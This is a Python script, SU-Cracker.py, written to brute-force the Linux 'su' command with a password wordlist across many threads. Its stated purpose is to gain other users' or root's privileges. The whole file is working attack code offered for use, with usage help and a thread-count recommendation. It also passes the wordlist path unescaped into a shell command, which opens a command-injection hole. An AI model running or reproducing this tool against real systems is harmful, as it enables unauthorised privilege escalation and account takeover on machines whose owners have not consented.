################################################################################################
# SU-Cracker.py
# Developped by: Elaffifi Omar Badis
# email        : elaffifibadis@gmail.com        
################################################################################################
# This script has been developped under python3
# The aim of this script is launch a dictionnary attack on 'su' in order to elevate privileges
# either horizontally using existing acounts, or vertically using the 'root' account as a target
################################################################################################
# Tested on: Kali GNU/Linux 2020.4 
################################################################################################
# usage: python3 su-cracker.py [-h] username wordlist [threads]
#
# positional arguments: 
#   username    Username to switch to, must be entered
#   wordlist    Name or Path to Wordlist to use, must be entered
#   threads     Number of threads to launch, recommended between [100-200], 100 by default
#
# optional arguments:
# -h, --help  show this help message and exit  
################################################################################################

import os
import threading
import argparse
import subprocess as sp

BANNER = """
 ____   _   _          ____                     _                
/ ___| | | | |        / ___| _ __   __ _   ___ | | __  ___  _ __ 
\___ \ | | | | _____ | |    | '__| / _` | / __|| |/ / / _ \| '__|
 ___) || |_| ||_____|| |___ | |   | (_| || (__ |   < |  __/| |   
|____/  \___/         \____||_|    \__,_| \___||_|\_\ \___||_| 
"""

THREADS = list()        # Acuumulator for threads
THREADS_LIMIT = 100     # Default
STOP = False            # True if password found
Password_Found = ""     # The password if found

def checkIfUserIsRoot():
    proc = sp.Popen(['whoami'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.PIPE)
    # if current user is root
    if proc.stdout.read().decode().strip() == "root":
        return True
    # if current user is not root
    else:
        return False

def checkUser(username):
    proc = sp.Popen(['id', username], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.PIPE)
    # if user exists on current system
    if proc.stdout.read():
        return True
    # if user does not exist
    else:
        print("[!] Invalid or inexistant username.")
        return False

def checkWordlist(wordlist):
    # if wordlist exists
    if os.path.isfile(wordlist):
        return True
    # if wordlist does not exists
    else:
        print("[!] Invalid path to wordlist or wordlist does not exist.")
        return False

def checkThreads(threads):
    # if number of threads is positive
    if threads > 0 :
        global THREADS_LIMIT
        THREADS_LIMIT = threads
        return True
    # if number of threads is negative
    else:
        print("[!] Invalid thread number, taking 100 by default")
        return True

def banner(args):
    # Print banner
    print("=" * 65)
    print(BANNER)
    print("=" * 65)
    print("[+] Username : ",args.username)
    print("[+] Wordlist : ",args.wordlist)
    print("[+] Threads  : ",THREADS_LIMIT)
    print("=" * 65)

def runProcess(username,password):
    # Run the su command
    proc = sp.Popen(['su', '-', username], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.PIPE)
    proc.stdin.write(password.encode("utf-8"))
    _ , error = proc.communicate()
    if not proc.returncode:
        global Password_Found, STOP
        Password_Found = password.strip()
        STOP = True

def killThreads():
    # Waiting for last threads to join
    global THREADS
    for t in THREADS:
        t.join()
    
def loopThru(username,wordlist):
    print("[+] Attack started...")
    # Looping thru wordlist
    NUM_LINES = int(sp.getoutput("cat " + wordlist + "|wc -l"))
    with open(wordlist, "r", encoding="utf-8") as file:
        Thread_Counter = 1
        for password in file.readlines():
            progress = (Thread_Counter/NUM_LINES)*100
            print("[!] Current progress : %.02f" %progress, end="\r")

            if STOP == True:
                break
            else:
                t = threading.Thread(target=runProcess, args=(username,password.strip(),))
                global THREADS
                THREADS.append(t)
                t.start()

                # Checking if THREADS_LIMIT has been reached
                # Wait for concurrent threads to end and reinitialize THREADS
                global THREADS_LIMIT
                if Thread_Counter % THREADS_LIMIT == 0:
                    for t in THREADS:
                        t.join()
                    THREADS = list()
                Thread_Counter += 1

def outputPassword():
    killThreads()
    # OUTPUT
    global Password_Found
    if Password_Found:
        print("=" * 65)
        print('[+] Password found : {0}'.format(Password_Found))
        print("=" * 65)
    else:
        print("=" * 65)
        print('[-] Password not found')
        print("=" * 65)

def sayBye():
    print("\n")
    print("=" * 65)
    print("[!] Cheers !!")
    print("=" * 65)

if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("username", help="Username to switch to must be entered")
    parser.add_argument("wordlist", help="Name or Path to Wordlist to use must be entered")
    parser.add_argument("threads", help="Number of threads to launch, recommended between [100-200], 100 by default", nargs="?", const=100, type=int, default=100)
    args = parser.parse_args()
    
    if checkIfUserIsRoot():
        banner(args)
        print("[!] You are already 'root', you don't need me \o/")
        print("=" * 65)
    else:
        try:
            if checkUser(args.username) and checkWordlist(args.wordlist) and checkThreads(args.threads):
                banner(args)
                loopThru(args.username, args.wordlist)
                outputPassword()

        except KeyboardInterrupt:
            sayBye()

        except :
            print("=" * 65)
            print("[!] Try with a lower number of threads.")
            print("=" * 65)
